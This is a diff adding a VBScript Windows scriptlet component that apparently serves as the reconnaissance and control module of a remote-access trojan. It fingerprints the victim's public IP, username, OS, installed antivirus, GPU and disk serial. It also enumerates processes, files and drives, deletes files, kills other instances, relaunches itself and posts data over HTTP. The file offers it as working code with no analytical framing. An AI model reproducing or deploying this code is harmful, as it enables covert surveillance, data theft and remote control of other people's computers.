@@ -1,0 +1,282 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    progid="P0C"
+    classid="{F0001001-0101-0000-0000-0000FFEDA00C}"
+	>
+</registration>
+<public>
+    <method name="HTTPPost"></method>
+	<method name="IPAdress"></method>
+	<method name="InstallDateFunc"></method>
+	<method name="strNamepc"></method>
+	<method name="GetOs"></method>
+	<method name="GetAV"></method>
+	<method name="MaxFrameworkVersionCheck"></method>
+	<method name="ConvertToUnixTimeStamp"></method>
+    <method name="var6"></method>
+	<method name="GetGPU"></method>
+	<method name="DeleteAFile"></method>
+	<method name="enumprocess"></method>
+	<method name="HWIDf"></method>
+	<method name="GetFilesAndFolders"></method>
+	<method name="GetHardDirve"></method>
+	<method name="killPastInstances"></method>
+	<method name="genRndStr"></method>
+	<method name="runSelf"></method>
+</public>
+<script language="VBScript">
+<![CDATA[
+
+Function ConvertToUnixTimeStamp()
+    Dim d : d = CDate(Now)
+    ConvertToUnixTimeStamp = CStr(DateDiff("s", "01/01/1970 00:00:00", d))
+End Function
+
+Function HTTPPost(sUrl, sRequest)
+  set oHTTP = CreateObject("Microsoft.XMLHTTP")
+
+  oHTTP.open "POST", sUrl,false
+  oHTTP.send sRequest
+  HTTPPost = oHTTP.responseText
+ End Function
+ 
+Function IPAdress()
+	dim NIC1, Nic, StrIP, CompName
+	MyIP_WinHTTP = "0.0.0.0"
+    strURL = "https://api.ipify.org/"
+	Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
+	Set NIC1 = GetObject("winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
+	For Each Nic in NIC1
+		if Nic.IPEnabled then
+			StrIP = Nic.IPAddress(i)
+			Exit For
+		end if
+	next
+    objHTTP.Open "GET", strURL
+    objHTTP.Send
+	MyIP_WinHTTP = objHTTP.ResponseText
+	IPAdress = MyIP_WinHTTP + "/" + strip
+	
+ End Function
+
+
+Function InstallDateFunc(pathh)
+	Set objFSO = Createobject ("Scripting.FileSystemObject")
+	Set objFile = objFSO.GetFile(pathh)
+	InstallDateFunc = FormatDateTime(CDate(objFile.DateLastModified),2)	
+ End Function
+ 
+Function GetOs()
+	Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+	Set colItems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem",,48)
+	For Each objItem in colItems
+		GetOs = objItem.Caption
+	Next 
+ End Function
+ 
+ Function strNamepc()
+Set wshShell = CreateObject( "WScript.Shell" )
+
+strName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )
+strNamepc = strName
+ End Function
+ 
+Function GetAV()
+	security = ""
+	set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+	set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
+	for each objitem in colitems
+		versionstr = split (objitem.version,".")
+	next
+	osversion = versionstr (0) & "."
+	for  x = 1 to ubound (versionstr)
+		osversion = osversion &  versionstr (i)
+	next
+	osversion = eval (osversion)
+	if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"
+	set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
+	Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)
+	for each objantivirus in colantivirus
+		security  = security  & objantivirus.displayname & " ."
+	next
+	if security  = "" then security  = "NAN/AV"
+	GetAV = security
+ end function
+Function MaxFrameworkVersionCheck()
+	Dim Action_ :Set Action_ = CreateObject("Wscript.Shell")
+	Dim Obj_, Ver, Respond
+	Dim Regstry :Regstry = Array( _
+		"1 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\1.0.3705\Version", _
+		"1.1 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\1.1.4322\Version", _
+		"2 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727\Version", _
+		"3 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.0\Version", _
+		"3.5 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5\Version", _
+		"4 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\Version")
+	Dim RegstrySP :RegstrySP = Array( _
+		"1 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\1.0.3705\SP", _
+		"1.1 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\1.1.4322\SP", _
+		"2 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727\SP", _
+		"3 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.0\SP", _
+		"3.5 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5\SP", _
+		"4 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\SP")
+	On Error Resume Next
+	Respond = Respond & ".NET VERSIONS" & vbCrLf 
+	For Each Obj_ In Regstry
+		Ver = Split(Obj_," - ")
+		If IsNull(Action_.RegRead(Ver(1))) Then
+			Respond = Respond & "Not Installed: " & Ver(0) & vbCrLf 
+		Else
+			Respond = Respond & "Currently Installed: " & Ver(0) & " - " & "[" & Action_.RegRead(Ver(1)) & "]" & vbCrLf 
+		End If
+	Next 
+
+	Respond = Respond &  vbCrLf & ".NET SERVICE PACKS" & vbCrLf 
+	For Each Obj_ In RegstrySP
+		Ver = Split(Obj_," - ")
+		If IsNull(Action_.RegRead(Ver(1))) Then
+			Respond = Respond & "Not Installed: " & Ver(0) & vbCrLf 
+		Else
+			Respond = Respond & "Currently Installed: " & Ver(0) & " - " & "SP [" & Action_.RegRead(Ver(1)) & "]" & vbCrLf 
+		End If
+	Next
+	if instr(Respond,"Currently Installed: 2 - [2.0.50727.4927]") > 0 then 
+		MaxFrameworkVersionCheck = "true"
+	else
+		MaxFrameworkVersionCheck = "false"
+	end if
+ End Function
+ 
+function var6()
+if WScript.Arguments.Named.Exists("elevated") = false then
+		var6= "user"
+else
+		var6= "Admin"
+end if
+	  
+End function 
+Function GetGPU()
+	strComputer = "." 
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2") 
+Set colItems = objWMIService.ExecQuery( _
+    "SELECT * FROM Win32_VideoController",,48) 
+For Each objItem in colItems 
+   
+    CPUG=objItem.Caption
+Next
+GetGPU = CPUG 
+End Function
+
+Function GetCPU()
+strComputer = "."
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor",,48)
+For Each objItem in colItems
+
+   CPU = objItem.Name
+Next
+
+GetCPU = CPU 
+End Function
+
+ 
+Function DeleteAFile(filespec)
+	Dim fso
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	If (fso.FileExists(filespec)) Then fso.DeleteFile(filespec)
+ End Function
+
+function enumprocess ()
+	set objwmiservice = getobject("winmgmts:\\.\root\cimv2")
+	set colitems = objwmiservice.execquery("select * from win32_process",,48)
+	dim objitem
+	for each objitem in colitems
+		enumprocess = enumprocess & objitem.name & "|"
+		enumprocess = enumprocess & objitem.processid & "||"
+	next
+ end function
+
+Function HWIDf()
+	set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+	set disks = root.execquery ("select * from win32_logicaldisk")
+	for each disk in disks
+		if  disk.volumeserialnumber <> "" then
+			hwid = disk.volumeserialnumber
+			exit for
+		end if
+	next
+	HWIDf = hwid
+ End function
+function GetFilesAndFolders (enumdir)
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	GetFilesAndFolders = enumdir & "<|>"
+	for  each folder in objFSO.getfolder (enumdir).subfolders
+		GetFilesAndFolders = GetFilesAndFolders & folder.name & "|" & "d" & "|" & folder.attributes & "<|>"
+	next
+	for  each file in objFSO.getfolder (enumdir).files
+		GetFilesAndFolders = GetFilesAndFolders & file.name & "|" & file.size  & "|" & "f" & "|" & file.attributes & "<|>"
+	next
+ end function
+ 
+function GetHardDirve ()
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	for  each drive in objFSO.drives
+		if   drive.isready = true then
+			GetHardDirve = GetHardDirve & drive.path & "\" & "<|>"
+		end if
+	next
+ end Function
+Function killPastInstances(mutex,scriptName)
+ 
+	Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2") 
+	Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Process",,48) 
+	For Each objItem in colItems 
+ 
+		if instr(objItem.CommandLine, scriptName) > 0 Then
+		  ''If the instance of the script is NOT this instance
+		  if not instr(objItem.CommandLine, mutex) > 0 then
+ 
+		  	''Kill it!
+		  	objItem.Terminate()
+		  end if
+		end if
+	Next
+ end Function 
+ 
+Function genRndStr(Count)
+    Randomize
+    For i = 1 To Count
+        If (Int((1 - 0 + 1) * Rnd + 0)) Then
+            genRndStr = genRndStr & Chr(Int((90 - 65 + 1) * Rnd + 65))
+        Else
+            genRndStr = genRndStr & Chr(Int((57 - 48 + 1) * Rnd + 48))
+        End If
+    Next
+ End Function
+Function runSelf(extraArgStr,FullName,aa,ScriptFullna)
+  
+	''Are we runing in C or W script?
+	interpreter = "wscript.exe"
+	If Instr(1, FullName, "CScript", vbTextCompare) = 0 Then
+		interpreter = "wscript.exe"
+	else
+		interpreter = "cscript.exe"
+	end if
+ 
+	''Get current args
+	Set args = aa
+	argStr = ""
+	For Each arg In args
+		argStr = argStr & " " & arg
+	Next
+ 
+	''append new args if required
+	if extraArgStr <> "" then argStr = argStr & " " & extraArgStr
+ 
+    createObject("wscript.shell").Run interpreter & " """ & ScriptFullna & """" & argStr, 1, False
+    WScript.Quit:end Function
+
+]]>
+</script>
+</scriptlet>
